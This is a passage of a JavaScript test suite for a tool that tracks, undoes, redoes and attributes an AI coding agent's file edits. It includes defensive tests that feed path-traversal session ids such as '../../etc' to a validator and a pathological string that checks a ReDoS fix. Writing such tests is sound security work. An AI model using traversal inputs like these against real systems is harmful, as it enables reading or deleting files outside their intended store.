  assert.equal(fs.readFileSync(F, 'utf8'), 'b\n', 'disk untouched');
  assert.equal(fs.readFileSync(G, 'utf8'), 'y\n');
});

test('oplog: revertOperation restores EACH record to ITS OWN before-status', () => {
  freshHome();
  const S = 'op6';
  const dir = tmpWork();
  seedEdit(S, path.join(dir, 'a.txt'), 'a\n', 'b\n'); // #1 pending at journal time
  seedEdit(S, path.join(dir, 'b.txt'), 'x\n', 'y\n'); // #2 undone at journal time
  core.setStatus(S, 2, 'undone');
  core.setStatusMany(S, [1, 2], 'kept'); // journals prev {1: pending, 2: undone}
  const res = core.revertOperation(S, core.readOperations(S)[0]);
  assert.equal(res.restored, 2);
  assert.equal(core.findRecord(S, 1).status, 'pending');
  assert.equal(core.findRecord(S, 2).status, 'undone', 'never blanket-restored to one status');
});

test('assign: moves an edit between prompt rows, and every read side agrees', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const S = 'asg1';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const line = (ts, t) => JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', message: { role: 'user', content: t } });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [line(500, 'ask one'), line(1500, 'ask two')].join('\n') + '\n');
  seedEdit(S, path.join(cwd, 'a.txt'), 'a\n', 'b\n'); // #1 ts1000, ask 1
  seedEdit(S, path.join(cwd, 'b.txt'), 'x\n', 'y\n'); // #2 ts2000, ask 2
  const w0 = core.promptWindows(cwd, S);
  assert.deepEqual([w0[0].editIds, w0[1].editIds], [[1], [2]], 'temporal attribution before any override');
  core.appendScopeOverride(S, [2], w0[0].id); // move #2 to ask 1
  const w1 = core.promptWindows(cwd, S);
  assert.deepEqual([w1[0].editIds, w1[1].editIds], [[1, 2], []], 'the window rows follow the override');
  const sp = core.sessionPrompts(cwd, S);
  assert.deepEqual([sp[0].editIds, sp[1].editIds], [[1, 2], []], 'sessionPrompts agrees');
  assert.equal(sp[0].edits, 2);
  const sc = core.checkpointScope(cwd, S, '2');
  assert.deepEqual(sc.ids, [], 'rewinding from ask 2 now takes nothing — the edit belongs to ask 1');
  const cm = core.buildChangeMap(cwd, S, { root: cwd, prompts: true });
  assert.deepEqual(cm.prompts.map((p) => p.rollup.edits), [2, 0], 'the change-map rollups moved with it');
  core.appendScopeOverride(S, [2], null); // --clear
  assert.deepEqual(core.promptWindows(cwd, S)[1].editIds, [2], 'cleared — back to the recorded window');
});

test('assign: an unknown prompt id falls back to the temporal window, never dropping the edit', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const S = 'asg2';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    JSON.stringify({ timestamp: new Date(500).toISOString(), type: 'user', message: { role: 'user', content: 'only ask' } }) + '\n'
  );
  seedEdit(S, path.join(cwd, 'a.txt'), 'a\n', 'b\n');
  core.appendScopeOverride(S, [1], 'p_never_existed');
  assert.deepEqual(core.promptWindows(cwd, S)[0].editIds, [1], 'the edit stays in its temporal window');
});

test('assign: overrides survive a log rewrite (clean --resolved)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const S = 'asg3';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const line = (ts, t) => JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', message: { role: 'user', content: t } });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [line(500, 'ask one'), line(1500, 'ask two')].join('\n') + '\n');
  seedEdit(S, path.join(cwd, 'a.txt'), 'a\n', 'b\n'); // #1 ask 1
  seedEdit(S, path.join(cwd, 'b.txt'), 'x\n', 'y\n'); // #2 ask 2
  core.appendScopeOverride(S, [2], core.promptWindows(cwd, S)[0].id);
  core.setStatus(S, 1, 'kept');
  core.clearResolved(S); // rewrites the log, dropping #1
  assert.equal(core.readLog(S).length, 1, 'the kept record was compacted away');
  assert.equal(core.readScopeOverrides(S).size, 1, 'the override op survived the rewrite');
  const w = core.promptWindows(cwd, S);
  assert.deepEqual([w[0].editIds, w[1].editIds], [[2], []], 'attribution still follows it');
});

/**
 * A 60-line file where an edit elsewhere sits BETWEEN two edits to the same line.
 *
 * `#1` and `#3` rewrite line 10; `#2` rewrites line 50. All three chain perfectly (nothing outside the
 * session touched the file), so the chain is intact — only the ADJACENCY of the same-line pair is
 * broken. This is the shape a real session produces constantly: an agent revises one region, moves on,
 * and comes back to it.
 */
function threeEditsAroundOne(session, file) {
  const at = (line10, line50) =>
    Array.from({ length: 60 }, (_, i) => (i === 9 ? line10 : i === 49 ? line50 : `L${i}`)).join('\n') + '\n';
  const s0 = at('A0', 'B0');
  const s1 = at('A1', 'B0'); // #1 rewrites line 10
  const s2 = at('A1', 'B1'); // #2 rewrites line 50 — unrelated region, chained
  const s3 = at('A2', 'B1'); // #3 rewrites line 10 AGAIN — same code as #1
  seedEdit(session, file, s0, s1);
  seedEdit(session, file, s1, s2);
  seedEdit(session, file, s2, s3);
  return { s0, s3 };
}

test('units: a later edit reclaims lines a NON-ADJACENT earlier edit produced', () => {
  freshHome();
  const S = 'u1';
  const F = path.join(tmpWork(), 'f.txt');
  threeEditsAroundOne(S, F);
  // #1 no longer owns a single line on disk — #3 rewrote it. Reviewing it as its own unit asks for a
  // decision about text that is not there, which is the phantom row this exists to remove.
  //
  // #2 comes along, and that is deliberate rather than sloppy: the unit is shown by reading
  // (first.beforeBlob, last.afterBlob), so its members have to be CONTIGUOUS or the diff on screen
  // would contain a change the row does not claim. #2 sits between the two line-10 edits, so the
  // honest span is all three — one decision, whose diff is exactly what it says it is.
  assert.equal(core.pendingGroups(S).size, 1, 'one review unit, not three');
  assert.deepEqual(core.groupMembers(S, 1), [1, 2, 3], 'the span covering both line-10 edits');
  assert.deepEqual(core.groupMembers(S, 3), [1, 2, 3], 'membership resolves from any member');
});

test('units: independent regions in one file stay independently reviewable', () => {
  freshHome();
  const S = 'u1b';
  const F = path.join(tmpWork(), 'f.txt');
  const at = (l10, l50) =>
    Array.from({ length: 60 }, (_, i) => (i === 9 ? l10 : i === 49 ? l50 : `L${i}`)).join('\n') + '\n';
  seedEdit(S, F, at('A0', 'B0'), at('A1', 'B0')); // #1 line 10
  seedEdit(S, F, at('A1', 'B0'), at('A1', 'B1')); // #2 line 50 — chained, and nothing returns to line 10
  // Nothing spans the two, so combining them would take away a decision the reader can currently make.
  assert.equal(core.pendingGroups(S).size, 2, 'two regions, two units');
  assert.deepEqual(core.groupMembers(S, 1), [1]);
  assert.deepEqual(core.groupMembers(S, 2), [2]);
});

test('units: no line is claimed by two units — the displayed deltas sum to the net change', () => {
  freshHome();
  const S = 'u2';
  const F = path.join(tmpWork(), 'f.txt');
  threeEditsAroundOne(S, F);
  const units = core.reviewEdits(S);
  const sum = units.reduce(
    (a, r) => {
      const d = core.lineDelta(S, r);
      return { added: a.added + d.added, removed: a.removed + d.removed };
    },
    { added: 0, removed: 0 }
  );
  // Two lines changed, net. Three rows of +1/-1 would total +3/-3 — a line counted twice, which is how
  // a session that rewrote 2 lines comes to report 3 in every rollup that sums over review units
  // (`cmdList`, the prompt rows, the change-map rollups all fold `lineDelta` over exactly this list).
  // The assertion is the PROPERTY, not the unit count: however the units divide, they must divide the
  // net change without overlapping it.
  assert.deepEqual(sum, { added: 2, removed: 2 }, 'each changed line is owned by exactly one unit');
});

test('units: a broken chain resets ownership — nothing unions across it', () => {
  freshHome();
  const S = 'u3';
  const F = path.join(tmpWork(), 'f.txt');
  const at = (l10) => Array.from({ length: 60 }, (_, i) => (i === 9 ? l10 : `L${i}`)).join('\n') + '\n';
  seedEdit(S, F, at('A0'), at('A1')); // #1 rewrites line 10
  // Something outside the session rewrote the file between #1 and #2, so #2's before is NOT #1's
  // after. Nothing before that point is attributable, however similar the text looks.
  seedEdit(S, F, at('HUMAN'), at('A2')); // #2 rewrites line 10 — same line, different history
  assert.equal(core.pendingGroups(S).size, 2, 'a broken chain is a wall, not a hint');
  assert.deepEqual(core.groupMembers(S, 1), [1]);
  assert.deepEqual(core.groupMembers(S, 2), [2]);
});

test('undo: fileBaseline reverts all pending edits (quick-diff baseline)', () => {
  freshHome();
  const S = 'baseline';
  const F = path.join(tmpWork(), 'app.js');
  seedEdit(S, F, 'a\nb\n', 'a\nX\nb\n'); // #1: insert X
  seedEdit(S, F, 'a\nX\nb\n', 'a\nX\nb\nY\n'); // #2: append Y
  const current = 'a\nX\nb\nY\n';
  assert.equal(core.fileBaseline(S, F, current), 'a\nb\n', 'baseline reverts both pending edits');
  // a kept edit stays in the baseline; only the pending one is reverted
  core.setStatus(S, 1, 'kept');
  assert.equal(core.fileBaseline(S, F, current), 'a\nX\nb\n', 'kept #1 stays; only pending #2 reverted');
  // a file Claude never touched has no baseline delta
  assert.equal(core.fileBaseline(S, '/other/none.js', 'z\n'), 'z\n', 'untouched file: baseline == current');
});

test('redo: re-applies an undone edit, preserving later edits, then noop', () => {
  freshHome();
  const S = 'redo';
  const F = path.join(tmpWork(), 'r.txt');
  seedEdit(S, F, 'a\nb\nc\n', 'A\nb\nc\n'); // #1 top
  seedEdit(S, F, 'A\nb\nc\n', 'A\nb\nC\n'); // #2 bottom
  fs.writeFileSync(F, 'A\nb\nC\n');
  core.undoEdit(S, 1);
  assert.equal(fs.readFileSync(F, 'utf8'), 'a\nb\nC\n');
  const r = core.redoEdit(S, 1);
  assert.equal(r.status, 'redone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'A\nb\nC\n', 're-applied #1, #2 preserved');
  assert.equal(core.findRecord(S, 1).status, 'pending');
  assert.equal(core.redoEdit(S, 1).status, 'noop', 'redo of a live edit is a noop');
});

test('redo: re-creates a file whose creation was undone', () => {
  freshHome();
  const S = 'redocreate';
  const F = path.join(tmpWork(), 'n.txt');
  fs.writeFileSync(F, 'hi\n');
  seedEdit(S, F, null, 'hi\n'); // #1 create
  core.undoEdit(S, 1);
  assert.ok(!fs.existsSync(F), 'undo deleted the created file');
  assert.equal(core.redoEdit(S, 1).status, 'redone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'hi\n', 're-created');
  assert.equal(core.findRecord(S, 1).status, 'pending');
});

test('clean: gcSession removes only unreferenced blobs; removeSession deletes the dir', () => {
  freshHome();
  const S = 'gc';
  core.ensureStore(S);
  const F = path.join(tmpWork(), 'f.txt');
  const keep = core.writeBlob(S, Buffer.from('referenced'));
  core.appendLog(S, { id: 1, ts: 1000, tool: 'Edit', file: F, beforeBlob: null, afterBlob: keep, status: 'pending' });
  const orphan = core.writeBlob(S, Buffer.from('orphan-not-referenced'));
  const res = core.gcSession(S);
  assert.equal(res.removed, 1);
  assert.ok(res.bytes > 0);
  const blobs = fs.readdirSync(path.join(core.storeDir(S), 'blobs'));
  assert.ok(blobs.includes(keep) && !blobs.includes(orphan));
  core.removeSession(S);
  assert.ok(!fs.existsSync(core.storeDir(S)));
});

test('clean: gcSession keeps blobs referenced by an in-flight staging record (not yet committed)', () => {
  freshHome();
  const S = 'gcstage';
  core.ensureStore(S);
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'a\n', 'b\n'); // a committed edit (its blobs are referenced)
  // A PreToolUse that already snapshotted a before-blob but whose PostToolUse hasn't appended yet.
  const stagedBlob = core.writeBlob(S, Buffer.from('staged-before\n'));
  const key = core.pathKey('/some/other.txt');
  core.writeStaging(S, key, { file: '/some/other.txt', tool: 'Edit', beforeBlob: stagedBlob });
  core.gcSession(S);
  assert.ok(
    fs.existsSync(path.join(core.storeDir(S), 'blobs', stagedBlob)),
    'staged before-blob must survive GC (else the imminent edit is unrecoverable)'
  );
});

test('clean: gcSession keeps blobs referenced by the __bash__ manifest', () => {
  freshHome();
  const S = 'gcbash';
  core.ensureStore(S);
  const blob = core.writeBlob(S, Buffer.from('bash-before\n'));
  core.writeBashManifest(S, { files: { '/x/y.txt': blob }, ts: 1000 });
  core.gcSession(S);
  assert.ok(fs.existsSync(path.join(core.storeDir(S), 'blobs', blob)), 'manifest before-blob survives GC');
});

// --- scoped folder/file operations (--under): the one path rule shared by keep/undo/clean ---------
test('scope: isUnderPath matches an exact file + folder prefix, never a shared-prefix sibling', () => {
  const root = path.join(path.sep, 'root');
  const api = path.join(root, 'src', 'api');
  assert.ok(core.isUnderPath(api, api), 'exact path is under itself (file scope)');
  assert.ok(core.isUnderPath(path.join(api, 'x.ts'), api), 'a file beneath the folder matches');
  assert.ok(core.isUnderPath(path.join(api, 'deep', 'y.ts'), api), 'a nested file matches');
  assert.ok(!core.isUnderPath(path.join(root, 'src', 'api-v2', 'z.ts'), api), 'sibling sharing a name prefix must NOT match');
  assert.ok(!core.isUnderPath(path.join(root, 'src', 'other.ts'), api), 'unrelated file must NOT match');
});

test('scope: clearResolved(session, folder) drops resolved edits under the folder only', () => {
  freshHome();
  const S = 'scopeclear';
  core.ensureStore(S);
  const W = tmpWork();
  const src = path.join(W, 'src');
  const a = path.join(src, 'a.ts'); // resolved, under src → cleared
  const b = path.join(src, 'util', 'b.ts'); // resolved (nested), under src → cleared
  const c = path.join(W, 'lib', 'c.ts'); // resolved, OUTSIDE src → preserved
  const ia = seedEdit(S, a, 'a1\n', 'a2\n');
  const ib = seedEdit(S, b, 'b1\n', 'b2\n');
  const ic = seedEdit(S, c, 'c1\n', 'c2\n');
  const ip = seedEdit(S, a, 'a2\n', 'a3\n'); // pending, under src → preserved (never cleared)
  core.setStatus(S, ia, 'kept');
  core.setStatus(S, ib, 'undone');
  core.setStatus(S, ic, 'kept');
  const removed = core.clearResolved(S, src);
  assert.equal(removed, 2, 'only the two resolved edits under src are cleared');
  const survivors = core.readLog(S).map((r) => r.id).sort((x, y) => x - y);
  assert.deepEqual(survivors, [ic, ip].sort((x, y) => x - y), 'pending-under-scope + resolved-outside-scope survive');
});

test('scope: clearResolved(session, exactFile) clears only that file, leaving a sibling in the same dir', () => {
  freshHome();
  const S = 'scopeclearfile';
  core.ensureStore(S);
  const dir = path.join(tmpWork(), 'src');
  const a = path.join(dir, 'a.ts');
  const b = path.join(dir, 'b.ts'); // same folder, different file
  const ia = seedEdit(S, a, 'a1\n', 'a2\n');
  const ib = seedEdit(S, b, 'b1\n', 'b2\n');
  core.setStatus(S, ia, 'kept');
  core.setStatus(S, ib, 'kept');
  const removed = core.clearResolved(S, a); // file scope = exact match
  assert.equal(removed, 1);
  assert.deepEqual(core.readLog(S).map((r) => r.id), [ib], 'the sibling file is untouched');
});

test('scope: buildEditTree gives each folder an absolute path that matches its files via isUnderPath', () => {
  freshHome();
  const S = 'scopetree';
  core.ensureStore(S);
  const W = tmpWork();
  const a = path.join(W, 'src', 'a.ts'); // keeps `src` from compacting into `src/utils`
  const b = path.join(W, 'src', 'utils', 'b.ts');
  for (const [f, txt] of [[a, 'a2\n'], [b, 'b2\n']]) {
    fs.mkdirSync(path.dirname(f), { recursive: true });
    fs.writeFileSync(f, txt);
  }
  seedEdit(S, a, 'a1\n', 'a2\n');
  seedEdit(S, b, 'b1\n', 'b2\n');
  const tree = core.buildEditTree(S, { root: W });
  const src = tree.folders.find((f) => f.label === 'src');
  assert.ok(src, 'expected a top-level "src" folder');
  assert.equal(src.path, path.join(W, 'src'), 'folder.path is the absolute directory');
  assert.ok(core.isUnderPath(a, src.path) && core.isUnderPath(b, src.path), 'both files fall under the folder path');
});

test('store: a stale lock is broken so appendLog can never permanently block', () => {
  freshHome();
  const S = 'lock';
  core.ensureStore(S);
  // Simulate a crashed holder: a .lock file older than the stale threshold.
  const lp = path.join(core.storeDir(S), '.lock');
  fs.writeFileSync(lp, '999999');
  const old = new Date(Date.now() - 60000); // 60s ago > LOCK_STALE_MS (10s)
  fs.utimesSync(lp, old, old);
  const F = path.join(tmpWork(), 'f.txt');
  const id = seedEdit(S, F, 'a\n', 'b\n'); // seedEdit → appendLog acquires the lock; must not hang
  assert.equal(core.findRecord(S, id).status, 'pending', 'append succeeded despite a stale lock');
});

test('store: rejects traversing session ids (no read/write/rm -rf outside the store)', () => {
  freshHome();
  assert.equal(core.isSafeSessionId('750d33e9-aedd-4186-98a4-f03ce6716ed0'), true, 'a real UUID is fine');
  assert.equal(core.isSafeSessionId('..'), false);
  assert.equal(core.isSafeSessionId('.'), false);
  assert.equal(core.isSafeSessionId('a/b'), false);
  assert.equal(core.isSafeSessionId('../evil'), false);
  assert.throws(() => core.storeDir('..'), /invalid session id/, 'storeDir fail-closes on traversal');
  assert.throws(() => core.storeDir('../../etc'), /invalid session id/);
  assert.throws(() => core.removeSession('..'), /invalid session id|outside the store/, 'removeSession refuses to escape');
});

test('clean: clearResolved drops kept+undone, keeps pending', () => {
  freshHome();
  const S = 'clr';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'a\n', 'b\n'); // #1
  seedEdit(S, F, 'b\n', 'c\n'); // #2
  seedEdit(S, F, 'c\n', 'd\n'); // #3
  core.setStatus(S, 1, 'kept');
  core.setStatus(S, 2, 'undone');
  const removed = core.clearResolved(S);
  assert.equal(removed, 2, 'removed the kept + undone edits');
  const log = core.readLog(S);
  assert.equal(log.length, 1, 'only pending remains');
  assert.equal(log[0].id, 3);
  assert.equal(log[0].status, 'pending');
  assert.equal(core.clearResolved(S), 0, 'no-op when nothing resolved');
});

test('store: clearing resolved edits keeps the skip markers — the record that a change went UNcaptured', () => {
  freshHome();
  const S = 'clrskip';
  const dir = tmpWork();
  const F = path.join(dir, 'f.txt');
  const OUT = path.join(dir, 'elsewhere', 'big.bin');
  seedEdit(S, F, 'a\n', 'b\n'); // #1
  core.appendSkip(S, OUT, 'file too large (>5MB) or binary at commit');
  seedEdit(S, F, 'b\n', 'c\n'); // #2
  core.appendSkip(S, '<bash-tree>', 'Bash working tree exceeds the file cap');
  assert.equal(core.readSkips(S).length, 2, 'both markers recorded');

  core.setStatus(S, 1, 'kept');
  assert.equal(core.clearResolved(S), 1, 'the kept edit is dropped');
  // The rewrite rebuilds the log from readLog, which returns EDIT RECORDS only. Without carrying the
  // op lines across, Clear silently erased the one thing standing between an uncaptured edit and
  // silence — and `status` then reported zero skips.
  assert.equal(core.readSkips(S).length, 2, 'skip markers survive a clear');
  assert.equal(core.readLog(S).length, 1, 'and the pending edit is still the only record');

  // Repeating the clear must not duplicate or drop them either (the ops are re-read each time).
  core.setStatus(S, 2, 'undone');
  core.clearResolved(S);
  assert.equal(core.readSkips(S).length, 2, 'still exactly two after a second clear');

  // A SCOPED clear must not reach markers outside its scope.
  const S2 = 'clrskip2';
  seedEdit(S2, path.join(dir, 'in', 'a.txt'), 'a\n', 'b\n');
  core.appendSkip(S2, path.join(dir, 'OUT', 'keep.bin'), 'oversized, out of scope');
  core.setStatus(S2, 1, 'kept');
  core.clearResolved(S2, path.join(dir, 'in'));
  assert.equal(core.readSkips(S2).length, 1, 'a folder-scoped clear leaves another folder\'s marker alone');
});

test('undo: keep never resurrects a reverted edit — the ledger must not claim a change that is not on disk', () => {
  freshHome();
  const S = 'keepundone';
  const F = path.join(tmpWork(), 'k.txt');
  fs.writeFileSync(F, 'a\nb\n');
  seedEdit(S, F, 'a\n', 'a\nb\n'); // #1, pending
  core.setStatus(S, 1, 'undone');

  const r = core.keepGroup(S, 1);
  assert.equal(r.kept, 0, 'nothing is kept');
  assert.deepEqual(r.ids, [], 'and no id is reported as kept');
  assert.equal(core.readLog(S)[0].status, 'undone', 'the record stays undone');

  // Marking it kept would also RESOLVE it, so clearResolved would drop it and the revert could never
  // be redone — the failure this guards is data loss, not just a wrong label.
  assert.equal(core.clearResolved(S), 1, 'it is still resolved-as-undone, so a clear drops it');

  // The pending case is untouched.
  const S2 = 'keeppending';
  seedEdit(S2, F, 'a\n', 'a\nb\n');
  assert.equal(core.keepGroup(S2, 1).kept, 1, 'a pending edit is still kept normally');
});

test('ranges: locateEditInCurrent maps an edit to its current lines (positional)', () => {
  const L = core.locateEditInCurrent;
  // simple: no later edits -> the changed line
  assert.deepEqual(L('a\nb\nc\n', 'a\nB\nc\n', 'a\nB\nc\n'), [1]);
  // later edit inserted a line ABOVE -> range shifts down
  assert.deepEqual(L('a\nb\nc\n', 'a\nB\nc\n', 'HEADER\na\nB\nc\n'), [2]);
  // the edit's own line was later rewritten -> it drops out (no inline anchor)
  assert.deepEqual(L('a\nb\nc\n', 'a\nB\nc\n', 'a\nBB\nc\n'), []);
  // new-file create -> every surviving line
  assert.deepEqual(L('', 'x\ny\n', 'x\ny\n'), [0, 1]);
  // pure deletion introduces nothing
  assert.deepEqual(L('a\nb\nc\n', 'a\nc\n', 'a\nc\n'), []);
  // multi-line insert preserved, later append below doesn't disturb it
  assert.deepEqual(L('a\nb\n', 'a\nNEW1\nNEW2\nb\n', 'a\nNEW1\nNEW2\nb\nZ\n'), [1, 2]);
});

test('ranges: locateDeletionsInCurrent surfaces removed text + its anchor (red ghost text)', () => {
  const D = core.locateDeletionsInCurrent;
  // pure deletion in the middle -> removed 'b', anchored on the surviving next line
  assert.deepEqual(D('a\nb\nc\n', 'a\nc\n', 'a\nc\n'), [{ anchor: 1, lines: ['b'] }]);
  // even swap (modification) -> no deletion; the changed line renders green instead
  assert.deepEqual(D('a\nb\nc\n', 'a\nB\nc\n', 'a\nB\nc\n'), []);
  // shrink (remove 2, add 1) -> net deletion; both removed lines surface, anchored after the replacement
  assert.deepEqual(D('a\nb\nc\nd\n', 'a\nX\nd\n', 'a\nX\nd\n'), [{ anchor: 2, lines: ['b', 'c'] }]);
  // growth (remove 1, add 2) -> not a deletion
  assert.deepEqual(D('a\nb\nc\n', 'a\nX\nY\nc\n', 'a\nX\nY\nc\n'), []);
  // deletion at end-of-file -> anchored on the last surviving line
  assert.deepEqual(D('a\nb\nc\n', 'a\n', 'a\n'), [{ anchor: 0, lines: ['b', 'c'] }]);
  // a later edit inserted a line ABOVE -> the anchor shifts down with it
  assert.deepEqual(D('a\nb\nc\n', 'a\nc\n', 'HEADER\na\nc\n'), [{ anchor: 2, lines: ['b'] }]);
  // the deletion's region was later rewritten -> the hunk drops out
  assert.deepEqual(D('a\nb\nc\n', 'a\nc\n', 'a\nZZ\n'), []);
});

test('ranges: a file\'s edits are placed by COMPOSING the chain — and one empty snapshot cannot un-place the rest', () => {
  const chainLines = (chain, current) =>
    core.locateEditsInCurrent(chain.length, (i) => chain[i], current).map((p) => p.lines);

  // 1. On a chain whose lines survive to the buffer, composing agrees edit for edit with placing each
  //    edit on its own — there the hops are purely an optimization.
  const v0 = 'a\nb\nc\n';
  const v1 = 'a\nONE\nb\nc\n';
  const v2 = 'a\nONE\nb\nTWO\nc\n';
  const chain = [{ before: v0, after: v1 }, { before: v1, after: v2 }];
  assert.deepEqual(chainLines(chain, v2), [
    core.locateEditInCurrent(v0, v1, v2),
    core.locateEditInCurrent(v1, v2, v2),
  ]);
  assert.deepEqual(chainLines(chain, v2), [[1], [3]]);

  // 1b. It is NOT true in general, and the difference is the point of composing rather than a defect to
  //     paper over. When a line is deleted and later reintroduced with the same text, the copy standing
  //     in the buffer belongs to the LATER edit. Composition follows surviving lines, so the earlier
  //     edit comes back unplaced; a direct `after -> current` alignment matches it to the replacement and
  //     hands two edits the same line — so "undo" on the earlier one would point at the later one's work.
  //     Measured over randomized chains that reuse line text, the two disagree this way on 0.40% of
  //     edits. Under-reporting is the intended answer; an unplaced edit still lists, it only loses its
  //     class attribution (tree.ts passes `undefined` straight through to `classAt`).
  const base = 'a\nb\nc\nd\n';
  const withX = 'a\nb\nXXX\nc\nd\n';
  const readd = [
    { before: base, after: withX }, // #1 introduces XXX
    { before: withX, after: base }, // #2 reverts it
    { before: base, after: withX }, // #3 reintroduces the identical text
  ];
  const reintro = chainLines(readd, withX);
  assert.deepEqual(reintro[2], [2], 'the edit that actually authored the surviving line owns it');
  assert.deepEqual(reintro[0], [], 'the reverted edit stays unplaced rather than claiming its replacement');
  assert.deepEqual(core.locateEditInCurrent(base, withX, withX), [2], 'placed alone, the same edit DOES claim line 2 — which is exactly the mis-attribution composing avoids');

  // 2. An edit that DELETED the file leaves an empty `after`. Nothing survives a hop through nothing,
  //    so composing across it would wipe out every EARLIER edit's placement too — the deletion must
  //    sever the chain and re-anchor, not erase history. (`afterBlob: null` is a normal capture
  //    outcome, and an unreadable blob reads as '' by the same path.)
  const deleted = [
    { before: v0, after: v1 }, // inserts ONE
    { before: v1, after: '' }, // deletes the file
    { before: '', after: v1 }, // recreates it
  ];
  const placed = chainLines(deleted, v1);
  assert.deepEqual(placed[0], [1], 'the first edit keeps its placement across a deletion later in the chain');
  assert.deepEqual(placed[1], [], 'the deletion itself introduces nothing');
  assert.deepEqual(placed[2], [0, 1, 2, 3], 'the re-create marks every restored line');

  // 3. The single-edit wrappers are the batch form with one element — same code path, no drift.
  assert.deepEqual(core.locateEditInCurrent(v0, v1, v1), chainLines([{ before: v0, after: v1 }], v1)[0]);
});

test('observe: recap "next steps" heading matching is linear-time on a pathological line (no ReDoS)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const S = 'redos';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  // A line that made the old `\s*\**\s*` heading regex backtrack O(n^2): marker, 100k spaces, marker.
  const evil = '#' + ' '.repeat(100000) + 'x';
  const tx = JSON.stringify({
    sessionId: S,
    timestamp: new Date().toISOString(),
    type: 'assistant',
    message: { role: 'assistant', content: [{ type: 'text', text: evil }] },
  });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);
  const t0 = Date.now();
  const sug = core.transcriptSuggestions(cwd, S); // runs recapNextSteps on lastSummary
  const elapsed = Date.now() - t0;
  assert.ok(Array.isArray(sug), 'returns a list');
  assert.ok(elapsed < 1000, `heading match must be linear (took ${elapsed}ms; the O(n^2) bug takes many seconds)`);
});

test('classes: detectClasses spans + classAt (brace langs + python)', () => {
  const src = 'import x;\nexport class Foo {\n  a() { return 1 }\n}\nfunction loose() {}\nclass Bar {\n  b() {}\n}\n';
  const spans = core.detectClasses(src);
  assert.equal(spans.length, 2);
  assert.equal(spans[0].name, 'Foo');
  assert.deepEqual([spans[0].start, spans[0].end], [1, 3]);
  assert.equal(spans[1].name, 'Bar');
  assert.equal(core.classAt(spans, 2)?.name, 'Foo', 'edit inside Foo');
  assert.equal(core.classAt(spans, 4), null, 'loose function -> no class');
  assert.equal(core.classAt(spans, 6)?.name, 'Bar');
  const py = core.detectClasses('class P:\n    def m(self):\n        pass\nx = 1\n');
  assert.equal(py.length, 1);
  assert.equal(py[0].name, 'P');
  assert.equal(py[0].end, 2, 'python body ends before dedent');
});

test('observe: correlates edits to transcript reasoning + heuristic flags/suggestions', () => {
  freshHome();
  const S = 'obs';
  const cwd = tmpWork();
  const F = path.join(cwd, 'app.js');
  seedEdit(S, F, null, 'function x(){}\n'); // #1 create
  seedEdit(S, F, 'function x(){}\n', 'function x(){}\n// TODO fix\n'); // #2 add TODO
  // fake Claude transcript in the project dir
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = [
    { message: { role: 'assistant', content: [{ type: 'text', text: 'Creating the x function.' }, { type: 'tool_use', name: 'Write', input: { file_path: F } }] } },
    { message: { role: 'assistant', content: [{ type: 'text', text: 'Adding a TODO note.' }, { type: 'tool_use', name: 'Edit', input: { file_path: F } }] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);

  const reasoning = core.reasoningByEdit(cwd, S);
  assert.equal(reasoning.get(1), 'Creating the x function.', 'edit #1 gets its reasoning');
  assert.equal(reasoning.get(2), 'Adding a TODO note.', 'edit #2 gets its reasoning');

  assert.match(core.summarize(S, core.findRecord(S, 1)), /created app\.js/);
  assert.ok(core.flagsFor(S, core.findRecord(S, 2)).some((f) => /TODO/.test(f.message)), 'flags the TODO');
  assert.ok(core.heuristicSuggestions(S).some((s) => /test/i.test(s)), 'suggests tests for the source file');
});

test('observe: reasoning carries forward across messages (thinking + separate tool_use)', () => {
  freshHome();
  const S = 'obs2';
  const cwd = tmpWork();
  const F = path.join(cwd, 'y.js');
  seedEdit(S, F, null, 'y\n'); // #1
  seedEdit(S, F, 'y\n', 'y\nz\n'); // #2
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = [
    { message: { role: 'assistant', content: [{ type: 'thinking', thinking: 'Plan: create y then add z.' }] } }, // reasoning, no tool
    { message: { role: 'assistant', content: [{ type: 'tool_use', name: 'Write', input: { file_path: F } }] } }, // tool, no text -> inherits thinking
    { message: { role: 'assistant', content: [{ type: 'text', text: 'Now adding z.' }, { type: 'tool_use', name: 'Edit', input: { file_path: F } }] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);
  const m = core.reasoningByEdit(cwd, S);
  assert.equal(m.get(1), 'Plan: create y then add z.', 'edit #1 inherits the preceding thinking block');
  assert.equal(m.get(2), 'Now adding z.', 'edit #2 uses its own same-message text');
});

test('observe: a Bash record between two edits does not shift reasoning to the wrong edit', () => {
  freshHome();
  const S = 'obs3';
  const cwd = tmpWork();
  const F = path.join(cwd, 'app.js');
  // #1 Edit, #2 Bash (e.g. `prettier --write app.js`), #3 Edit — all to the same file.
  seedEdit(S, F, 'a\n', 'b\n'); // #1 Edit
  core.appendLog(S, { id: core.nextId(S), ts: 2000, tool: 'Bash', file: F, beforeBlob: null, afterBlob: core.writeBlob(S, Buffer.from('B\n')), status: 'pending' }); // #2 Bash
